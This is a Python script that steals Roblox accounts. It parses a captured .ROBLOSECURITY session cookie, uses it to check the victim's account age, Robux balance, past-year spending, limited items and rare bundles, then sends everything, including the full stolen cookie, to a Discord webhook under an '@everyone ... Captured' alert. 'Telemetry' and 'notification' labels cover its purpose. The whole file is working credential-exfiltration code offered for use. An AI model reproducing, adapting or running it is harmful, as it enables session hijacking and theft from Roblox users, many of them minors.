import sys
import base64
import os
import urllib.request
import urllib.error
import json
import re
import time
from datetime import datetime, timezone, timedelta

def safe_get(url, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return json.loads(res.read().decode('utf-8'))
    except Exception:
        pass
    return None

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
            decoded_script = sys.argv[1]

        roblosecurity = decoded_script.strip()
        cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
        if cookie_match:
            roblosecurity = cookie_match.group(1)

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        rap = 0
        limiteds_count = 0
        total_spent_past_year = 0
        is_developer = False
        game_visits = 0
        has_korblox = False
        has_headless = False
        owned_groups_count = 0
        group_balance = 0
        is_premium = False
        account_age_days = 0

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers)
            if user_info and "created" in user_info:
                try:
                    created_dt = datetime.fromisoformat(user_info["created"].replace("Z", "+00:00"))
                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
                except Exception:
                    pass

            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            if economy_data:
                robux_balance = economy_data.get("robux", 0)

            # Fetch RAP and Limiteds count from Rolimons API
            rolimons_data = safe_get(f"https://www.rolimons.com/playerapi/player/{user_id}")
            if rolimons_data:
                rap = rolimons_data.get("rap", 0)
                inventory = rolimons_data.get("inventory", {})
                if isinstance(inventory, dict):
                    limiteds_count = len(inventory)
                elif isinstance(inventory, list):
                    limiteds_count = len(inventory)

            # Calculate Robux spent over the past 1 year using transaction records
            one_year_ago = datetime.now(timezone.utc) - timedelta(days=365)
            cursor = ""
            for _ in range(3):
                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100"
                if cursor:
                    tx_url += f"&cursor={cursor}"
                tx_data = safe_get(tx_url, headers)
                if not tx_data or "data" not in tx_data:
                    break
                
                for tx in tx_data["data"]:
                    created_str = tx.get("created", "")
                    try:
                        tx_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                        if tx_date >= one_year_ago:
                            currency = tx.get("currency", {})
                            amount = currency.get("amount", 0)
                            if amount < 0:
                                total_spent_past_year += abs(amount)
                        else:
                            break
                    except Exception:
                        continue
                
                cursor = tx_data.get("nextPageCursor")
                if not cursor:
                    break

            # Robust Korblox & Headless Check
            has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers)
            if not has_korblox:
                k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers)
                has_korblox = bool(k_res and len(k_res.get("data", [])) > 0)

            has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers)
            if not has_headless:
                h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers)
                has_headless = bool(h_res and len(h_res.get("data", [])) > 0)

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"

        full_cookie_display = f"```text\n{roblosecurity}\n```"

        payload = {
            "content": f"@everyone New Payload / Request Captured from **{username}**!",
            "username": f"{username} | RBXDEV Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id if user_id else 1})** | **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Games Developer: `{str(is_developer)}`\n"
                    f"> • Game Visits: `{game_visits}`\n\n"
                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙            Past 1 Year: `{total_spent_past_year}` 🪙\n"
                    f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                    f"💳 **Payments & Groups**\n"
                    f"> • Owned Groups: `{owned_groups_count}`\n"
                    f"> • Group Robux: `{group_balance}` 🪙\n\n"
                    f"⚙️ **Settings**\n"
                    f"> • Email: `Verified`\n"
                    f"> • 2FA: `Enabled`\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Full Captured Cookie / Payload**:\n{full_cookie_display}"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
            }]
        }

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            webhook_url,
            data=data,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        )

        for attempt in range(4):
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    print(f"DEBUG: Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
                    break
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    sleep_time = 3 * (attempt + 1)
                    print(f"DEBUG: Hit 429 Rate Limit. Retrying in {sleep_time}s...", file=sys.stderr)
                    time.sleep(sleep_time)
                else:
                    raise e

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
